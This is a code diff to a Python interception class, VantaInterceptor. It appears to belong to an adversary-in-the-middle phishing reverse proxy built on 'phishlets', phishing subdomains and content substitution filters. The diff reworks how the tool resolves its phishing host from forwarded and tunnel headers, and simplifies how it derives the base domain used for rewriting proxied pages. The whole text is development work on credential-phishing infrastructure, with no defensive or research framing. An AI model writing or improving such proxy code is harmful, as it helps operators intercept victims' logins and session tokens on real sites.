@@ -199,7 +199,18 @@ class VantaInterceptor:
                 except Exception:
                     pass
                 try:
-                    flow.metadata["v_ph_host"] = host
+                    # Prefer external/tunnel host when available
+                    h_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
+                    xfwd = flow.request.headers.get("x-forwarded-host")
+                    import re as _re_ip
+                    cand = (xfwd or h_hdr or host).split(",")[0].strip()
+                    if ":" in cand:
+                        cand = cand.split(":", 1)[0]
+                    if _re_ip.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
+                        ph_effective = host
+                    else:
+                        ph_effective = cand
+                    flow.metadata["v_ph_host"] = ph_effective
                     flow.metadata["v_tgt_host"] = target_host
                 except Exception:
                     pass
@@ -226,7 +237,17 @@ class VantaInterceptor:
                         pass
                     if not hasattr(flow, "metadata"):
                         flow.metadata = {}
-                    flow.metadata["v_ph_host"] = host
+                    h_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
+                    xfwd = flow.request.headers.get("x-forwarded-host")
+                    import re as _re_ip2
+                    cand = (xfwd or h_hdr or host).split(",")[0].strip()
+                    if ":" in cand:
+                        cand = cand.split(":", 1)[0]
+                    if _re_ip2.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
+                        ph_effective = host
+                    else:
+                        ph_effective = cand
+                    flow.metadata["v_ph_host"] = ph_effective
                     flow.metadata["v_tgt_host"] = first_target
                     self.logger.debug(f"Fallback host map: {host} -> {first_target}")
             except Exception:
@@ -531,17 +552,7 @@ class VantaInterceptor:
             # Let's try to extract it from the request host if possible.
             if not ph_host: return
 
-            parts = ph_host.split('.')
-            if len(parts) >= 2:
-                base_domain = ".".join(parts[-2:]) # simplistic
-                # If we have a known subdomain from proxy_hosts, we can subtract it.
-                # Find which proxy_host matches ph_host
-                for ph in self.phishlet.proxy_hosts:
-                    if ph_host.startswith(ph.phish_sub + "."):
-                        base_domain = ph_host[len(ph.phish_sub)+1:]
-                        break
-            else:
-                base_domain = ph_host # localhost?
+            base_domain = ph_host
 
             for f in getattr(self.phishlet, "sub_filters", []):
                 # Check mime
